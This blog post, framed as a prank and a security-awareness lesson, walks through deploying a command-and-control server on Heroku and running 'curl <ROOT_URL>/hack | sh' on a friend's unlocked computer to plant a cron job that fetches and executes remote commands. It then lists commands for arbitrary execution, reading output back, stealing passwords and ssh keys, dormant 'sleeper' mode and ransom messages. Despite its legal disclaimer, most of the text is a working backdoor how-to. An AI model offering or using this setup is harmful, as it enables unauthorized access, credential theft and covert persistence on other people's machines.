---
author: Chet Corcos
authorTwitter: none
authorFacebook: https://facebook.com/1165511785
title: "How to hack your friends"
subTitle: "My friends often leave their computers open and unlocked. I tell them they should probably get in the habit of locking their computers, b..."
coverSrc: https://cdn-images-1.medium.com/max/2000/1*CRdFzUjOuDE-qB0ASTk9yQ.jpeg
url: https://medium.freecodecamp.org/how-to-hack-your-friends-eef055389344
id: how-to-hack-your-friends-eef055389344
date: 2016-07-27T18:46:15.178Z
tags: [
  "Security",
  "Humor",
  "Tech",
  "Technology",
  "Programming"
]
---
# How to hack your friends







![](https://cdn-images-1.medium.com/max/2000/1*CRdFzUjOuDE-qB0ASTk9yQ.jpeg)







My friends often leave their computers open and unlocked. I tell them they should probably get in the habit of locking their computers, but they don’t listen to me. So I’ve created a simple project to hack my friends and show them the importance of computer security.

All I need to do is wait for them to leave their computer unlocked for a few seconds, open up their terminal, and type a single, short command.



![](https://cdn-images-1.medium.com/max/1600/1*ZRZjvQp1_tVNl_jl6gxDWA.png)



That’s it! Their computer is now infected and I can run whatever commands I want on this computer remotely. Pretty sweet, right? Or perhaps shocking?

Hacking is illegal. Specifically:

> “intentionally access[ing] a computer without authorization or exceed[ing] authorized access” — The Computer Fraud and Abuse Act (18 U.S.C. 1030)

So keep in mind that the purpose of this article is to show you just how easy it would be for someone with bad intentions to hack you so you can avoid getting hacked yourself.

It doesn’t take some hacker genius to wreck your life — any “script kiddy” who can gain physical access to your computer can compromise you by downloading a script containing just 50 lines of code.

### Getting Setup

All of the code for this project lives in [this repository](https://github.com/ccorcos/hack/) if you want to jump right in, but I’ll explain how it all works below.

First, you just need to clone the repo, install its dependencies, and symlink the _hack_ command line interface (CLI) tool.

<pre name="bb06" id="bb06" class="graf graf--pre graf-after--p">git clone [https://github.com/ccorcos/hack.git](https://github.com/ccorcos/hack.git)  
git remote remove origin  
cd hack  
npm install  
npm link</pre>

Next, you need to setup Heroku to host the scripts that will be running on your friends machine. If you’ve never used Heroku before, [signup here](https://signup.heroku.com/) (it’s free!) and set up their CLI tool on your machine.

<pre name="0651" id="0651" class="graf graf--pre graf-after--p">brew install heroku-toolbelt  
heroku login</pre>

Now inside the _hack_ repo, create a Heroku app with an easy name to remember. I’m using _hacker-chet._

<pre name="086a" id="086a" class="graf graf--pre graf-after--p">heroku create hacker-chet</pre>

Then you need to run a command to do a little setup. All it’s really doing is getting the root url for your Heroku website and putting it in your _package.json_. This way the server can inject the app url into the shell scripts.

<pre name="d970" id="d970" class="graf graf--pre graf-after--p">npm run init</pre>

You can start up the server locally if you want to hack yourself and test things out.

<pre name="9707" id="9707" class="graf graf--pre graf-after--p">npm start</pre>

Or you can deploy to Heroku.

<pre name="7740" id="7740" class="graf graf--pre graf-after--p">npm run deploy</pre>

Now you’re ready to hack!

### Hack API

The beauty of this program is that to start hacking someone, you just need to run a single command on their machine.

<pre name="8056" id="8056" class="graf graf--pre graf-after--p">curl <ROOT_URL>/hack | sh</pre>

_ROOT_URL_ is the specific path to your application. When you’re running the server locally, this will be _localhost:5000_ and when you deploy to Heroku, it will be something like _<APP_NAME>.herokuapp.com_.

What this does is sets up a cron job — a “chronological job” that reruns tasks at certain times — to ping the _/env/live_ endpoint every minute and pipes the result to _sh_. It’s actually quite simple! And Heroku gives you HTTPS for free so its “secure” right?

Once you’ve hacked your friend, you can do everything else with the command line tool from your computer.

The _hack_ tool has a concept of different hacked environments. When you hack someone using the _/hack_ endpoint, that person starts off in the _live_ environment. And for each environment, you can run a variety of different commands. I’ll demonstrate everything with a little walkthrough.

The following will rewrite the _live_ environment shell script to execute the following command which will say aloud “I’m watching you.”

<pre name="265c" id="265c" class="graf graf--pre graf-after--p">hack live exec "say 'I\'m watching you'"</pre>

Well it’s not going to work yet, you still have to re-deploy to your Heroku app.

<pre name="724a" id="724a" class="graf graf--pre graf-after--p">hack deploy</pre>



![](https://cdn-images-1.medium.com/max/1600/1*MLClljpzv4v1oVqbniDc1Q.png)



Now wait for the next minute and watch your friend’s computer ping your server by tailing the server logs.

<pre name="11b2" id="11b2" class="graf graf--pre graf-after--p">hack logs</pre>



![](https://cdn-images-1.medium.com/max/1600/1*S1TvBHYx1BjAqPlHh3PYUw.png)



The whole point of environments is so you can hack multiple people at the same time. To isolate people in different environments, you just need to change the name.

<pre name="0217" id="0217" class="graf graf--pre graf-after--p">hack live rename jon</pre>

Next time the live environment is pinged, it will rewrite the cron job to start pinging the _jon_ environment instead.



![](https://cdn-images-1.medium.com/max/1600/1*qUlhTFkuDzVyikrkF8mLpg.png)



You can do everything the same just by changing the environment argument.

<pre name="84e0" id="84e0" class="graf graf--pre graf-after--p">hack jon exec "say 'hello jon'"</pre>

Now if you’ve had enough fun for the day and the party’s over, you can _forget_ Jon and assure him that you’ve “unhacked” him.

<pre name="9d14" id="9d14" class="graf graf--pre graf-after--p">hack jon forget</pre>

This will erase the cron job from their computer. Or you might want to just put this environment in sleeper-cell mode so you can recover it later.

<pre name="b300" id="b300" class="graf graf--pre graf-after--p">hack jon interval 1d</pre>

Now, rather than pinging your server every minute (the default), it will ping every day at midnight. And when you want to wake it back up, you can change the interval back to every minute and the next day, you’re good to go!

<pre name="ae1f" id="ae1f" class="graf graf--pre graf-after--p">hack jon interval 1m</pre>

Some other fun things to do are setting up additional cron jobs. Here’s how you can wake your friend up at 6am every morning to remind him about computer security.

<pre name="e69e" id="e69e" class="graf graf--pre graf-after--p">hack jon cron "0 6 * * * say 'good morning jon, remember what I told you about locking your computer?'"</pre>

P.S. If you don’t remember how cron jobs work, [this is a great resource](http://www.nncron.ru/help/EN/working/cron-format.htm). It pretty much all comes down to this little diagram.

<pre name="a6b2" id="a6b2" class="graf graf--pre graf-after--p">* * * * *  
| | | | |  
| | | | |  
| | | | +---- Day of the Week   (range: 1-7, 1 standing for Monday)  
| | | +------ Month of the Year (range: 1-12)  
| | +-------- Day of the Month  (range: 1-31)  
| +---------- Hour              (range: 0-23)  
+------------ Minute            (range: 0-59)</pre>

One of my favorites is the _desktop_ preset which will download an image from a given URL and set it as the background photo.

<pre name="8c5b" id="8c5b" class="graf graf--pre graf-after--p">hack jon preset desktop [http://i.imgur.com/5FC2r9R.jpg](http://i.imgur.com/5FC2r9R.jpg)</pre>

And if you’ve written a ton of cron jobs and you don’t know what’s on there anymore, you can use the dump command.

<pre name="8fa2" id="8fa2" class="graf graf--pre graf-after--p">hack jon dump "crontab -l"</pre>

Now whip open your logs and you’ll see the output on the next ping. This is actually much more sinister now that you can get information back. If you wanted to be more nefarious, you can search for decrypted passwords or steal their ssh keys.

<pre name="c4e4" id="c4e4" class="graf graf--pre graf-after--p">hack jon preset passwords  
hack jon preset ssh</pre>

But if you just want to give him a good old-fashioned scare, send him a ransom message!

<pre name="0fd7" id="0fd7" class="graf graf--pre graf-after--p">hack jon preset ransom "Hello Jon, I told you not to leave your computer unlocked."</pre>



![](https://cdn-images-1.medium.com/max/1600/1*LVKyqVyEoy6oynsrcuwP_w.png)



Lastly, if you find yourself adding a bunch of cron jobs and just want to start over, reset is here to help.

<pre name="4106" id="4106" class="graf graf--pre graf-after--p">hack jon reset</pre>

Now go have (responsible) fun with this thing and let me know what your favorite pranks are by [submitting a pull request](https://github.com/ccorcos/hack) with a new command or preset!

Happy Hacking!








